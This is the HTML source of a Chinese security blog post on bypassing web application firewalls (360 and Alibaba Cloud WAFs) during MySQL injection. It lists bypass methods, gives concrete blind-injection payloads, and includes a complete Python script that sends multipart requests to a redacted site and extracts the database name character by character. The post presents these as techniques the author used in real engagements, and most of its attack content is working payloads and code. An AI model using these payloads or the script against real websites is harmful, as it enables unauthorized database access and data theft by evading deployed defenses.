@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="7_up Blog -致力于网络安全">
+    <meta name="author" content="7_up">
+    
+    <title>
+        
+            sql注入绕过waf的一些姿势 |
+        
+        7_up Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/aa.svg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"77up.top","root":"/","language":"zh-Hans","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":false,"number":false,"expand_all":false,"init_open":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.svg","favicon":"/images/aa.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"致力于网络安全"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.5"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                7_up Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">sql注入绕过waf的一些姿势</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">7_up</span>
+                        
+                            <span class="author-label">Lv1</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2022-01-14 23:57:51</span>
+        <span class="mobile">2022-01-14 23:57</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/web/">web</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/web/">web</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h2 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a><strong>1、前言</strong></h2><h6 id="目前sql注入绕过waf的姿势有很多，今天我来写下mysql注入绕过waf里面的一些姿势，是我平时实战里遇到的情况"><a href="#目前sql注入绕过waf的姿势有很多，今天我来写下mysql注入绕过waf里面的一些姿势，是我平时实战里遇到的情况" class="headerlink" title="目前sql注入绕过waf的姿势有很多，今天我来写下mysql注入绕过waf里面的一些姿势，是我平时实战里遇到的情况"></a>目前sql注入绕过waf的姿势有很多，今天我来写下mysql注入绕过waf里面的一些姿势，是我平时实战里遇到的情况</h6><p><strong>绕过waf的一些常见方法</strong></p>
+<p>①关键字大小写混合</p>
+<p>②关键字替换</p>
+<p>③使用编码</p>
+<p>④使用注释</p>
+<p>⑤等价的函数和命令</p>
+<p>⑥使用特殊符号</p>
+<p>⑦HTTP参数控制</p>
+<p>⑧缓冲区溢出</p>
+<p>⑨整合绕过</p>
+<h5 id="1-开局一个搜索框-360-waf"><a href="#1-开局一个搜索框-360-waf" class="headerlink" title="#1.开局一个搜索框(360_waf)"></a>#1.开局一个搜索框(360_waf)</h5><p><img src="https://ae01.alicdn.com/kf/Heccbbcffa9174fc0b99457d34c00420ac.png"></p>
+<h6 id="tips-这种搜索框处的sql注入，后端的sql语句通常都是使用了模糊查询，所以我们平时闭合语句的时候要注意"><a href="#tips-这种搜索框处的sql注入，后端的sql语句通常都是使用了模糊查询，所以我们平时闭合语句的时候要注意" class="headerlink" title="tips:这种搜索框处的sql注入，后端的sql语句通常都是使用了模糊查询，所以我们平时闭合语句的时候要注意"></a><strong>tips:这种搜索框处的sql注入，后端的sql语句通常都是使用了模糊查询，所以我们平时闭合语句的时候要注意</strong></h6><h6 id="2-啪的一声，很快啊，360waf把我给拦截了，这里我经过fuzz得到了该waf拦截关键字和空格，闭合语句为a-’"><a href="#2-啪的一声，很快啊，360waf把我给拦截了，这里我经过fuzz得到了该waf拦截关键字和空格，闭合语句为a-’" class="headerlink" title="#2.啪的一声，很快啊，360waf把我给拦截了，这里我经过fuzz得到了该waf拦截关键字和空格，闭合语句为a%’)"></a><strong>#2.啪的一声，很快啊，360waf把我给拦截了，这里我经过fuzz得到了该waf拦截关键字和空格，闭合语句为a%’)</strong></h6><p><img src="https://ae01.alicdn.com/kf/Hab769454e5ac446c8746ebc2b5aea820R.png"></p>
+<h6 id="3-绕过它！！"><a href="#3-绕过它！！" class="headerlink" title="#3.绕过它！！"></a><strong>#3.绕过它！！</strong></h6><h6 id="这里空格可以使用括号来代替，而这里的waf连select等关键词都拦截了，除非mysql版本高，不然很难绕过select，而这里我们运用了http的协议覆盖来绕过它"><a href="#这里空格可以使用括号来代替，而这里的waf连select等关键词都拦截了，除非mysql版本高，不然很难绕过select，而这里我们运用了http的协议覆盖来绕过它" class="headerlink" title="这里空格可以使用括号来代替，而这里的waf连select等关键词都拦截了，除非mysql版本高，不然很难绕过select，而这里我们运用了http的协议覆盖来绕过它"></a>这里空格可以使用括号来代替，而这里的waf连select等关键词都拦截了，除非mysql版本高，不然很难绕过select，而这里我们运用了http的协议覆盖来绕过它</h6><h6 id="paylaod：2021-’-amp-amp-ascii-substr-database-1-1-gt-97"><a href="#paylaod：2021-’-amp-amp-ascii-substr-database-1-1-gt-97" class="headerlink" title="paylaod：2021%’)&amp;&amp;(ascii(substr(database(),1,1))&gt;97#"></a><strong>paylaod：2021%’)&amp;&amp;(ascii(substr(database(),1,1))&gt;97#</strong></h6><img src="https://ae01.alicdn.com/kf/H4591ffe96b9345d9bc2833a0ec72a0f0k.jpg" style="zoom:200%;" />
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以看到这是个上传包的格式，HTTP头里的Content-Type一般有application/x-www-form-urlencoded，multipart/form-data，text/plain三种，其中multipart/form-data表示数据被编码为一条消息，页上的每个控件对应消息中的一个部分。所以，当waf没有规则匹配该协议传输的数据时可被绕过。</span><br></pre></td></tr></table></figure>
+
+<h6 id="构造python脚本进行注入"><a href="#构造python脚本进行注入" class="headerlink" title="构造python脚本进行注入"></a>构造python脚本进行注入</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>:<span class="string">&quot;www.xxxx.cn&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>:<span class="string">&quot;https://www.xxx.cn/search.php?keyword=233&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">session=requests.session()</span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line">url = <span class="string">&quot;https://www.xxxx.cn/search.php/test.css&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload=<span class="string">&quot;2021%&#x27;)&amp;&amp;(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        data=OrderedDict([(<span class="string">&quot;keyword&quot;</span>, (<span class="literal">None</span>, payload))])</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=session.post(url,headers=headers,files=data)</span><br><span class="line">            <span class="comment"># print(r.request.body)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(r.text)&gt;<span class="number">13106</span>:</span><br><span class="line">                result=result+<span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> TimeoutError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;注入结束&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h6 id="成功注入出数据"><a href="#成功注入出数据" class="headerlink" title="成功注入出数据"></a>成功注入出数据</h6><p><img src="https://ae01.alicdn.com/kf/Hc2810e8fd4974d4c8d0c36b6ce3763b7l.png"></p>
+<h6 id="1-开局一个api接口-阿里云waf"><a href="#1-开局一个api接口-阿里云waf" class="headerlink" title="#1.开局一个api接口(阿里云waf)"></a><strong>#1.开局一个api接口</strong>(阿里云waf)</h6><h6 id="ps：这个是我之前src挖的一个盲注入，修复了，所以就没图了，见谅"><a href="#ps：这个是我之前src挖的一个盲注入，修复了，所以就没图了，见谅" class="headerlink" title="ps：这个是我之前src挖的一个盲注入，修复了，所以就没图了，见谅"></a>ps：这个是我之前src挖的一个盲注入，修复了，所以就没图了，见谅</h6><h6 id="这里经过fuzz也得到了他过滤了空格，ascii，substr，user-select-gt-lt-等众多函数"><a href="#这里经过fuzz也得到了他过滤了空格，ascii，substr，user-select-gt-lt-等众多函数" class="headerlink" title="这里经过fuzz也得到了他过滤了空格，ascii，substr，user(),select,=,&gt;,&lt;等众多函数"></a>这里经过fuzz也得到了他过滤了空格，ascii，substr，user(),select,=,&gt;,&lt;等众多函数</h6><h6 id="这里我用了等价函数的方式进行绕过"><a href="#这里我用了等价函数的方式进行绕过" class="headerlink" title="这里我用了等价函数的方式进行绕过"></a>这里我用了等价函数的方式进行绕过</h6><h6 id="总体payload为-admin’-mid-user-1-1-like-“-a-”"><a href="#总体payload为-admin’-mid-user-1-1-like-“-a-”" class="headerlink" title="总体payload为:admin’||(mid(@@user,1,1)like(“%a%”))#"></a>总体payload为:admin’||(mid(@@user,1,1)like(“%a%”))#</h6><h6 id="这里的mid等价余substr函数然后使用like模糊匹配，查看页面变化来判断字符"><a href="#这里的mid等价余substr函数然后使用like模糊匹配，查看页面变化来判断字符" class="headerlink" title="这里的mid等价余substr函数然后使用like模糊匹配，查看页面变化来判断字符"></a>这里的mid等价余substr函数然后使用like模糊匹配，查看页面变化来判断字符</h6><h6 id="这里也可以用hex-mid-函数来进行注入，效果一样，最后解码即可"><a href="#这里也可以用hex-mid-函数来进行注入，效果一样，最后解码即可" class="headerlink" title="这里也可以用hex(mid)函数来进行注入，效果一样，最后解码即可"></a>这里也可以用hex(mid)函数来进行注入，效果一样，最后解码即可</h6><h5 id="通过-SQL-函数绕过-SQL-注入-WAF-的案例研究参考链接：https-mp-weixin-qq-com-s-wf25AJssCzAz5RAwNgi33g"><a href="#通过-SQL-函数绕过-SQL-注入-WAF-的案例研究参考链接：https-mp-weixin-qq-com-s-wf25AJssCzAz5RAwNgi33g" class="headerlink" title="通过 SQL 函数绕过 SQL 注入 WAF 的案例研究参考链接：https://mp.weixin.qq.com/s/wf25AJssCzAz5RAwNgi33g"></a>通过 SQL 函数绕过 SQL 注入 WAF 的案例研究参考链接：<a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/wf25AJssCzAz5RAwNgi33g" >https://mp.weixin.qq.com/s/wf25AJssCzAz5RAwNgi33g<i class="fas fa-external-link-alt"></i></a></h5>
+        </div>
+
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/web/">#web</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2022/01/14/%E8%A1%A5%E5%A4%A9%E6%98%93%E8%BD%A6src%E7%9A%84%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">补天易车src的一次挖掘</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">7_up</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/code-copy.js"></script>
+
+
+
+
+<div class="post-scripts">
+    
+</div>
+
+
+
+</body>
+</html>
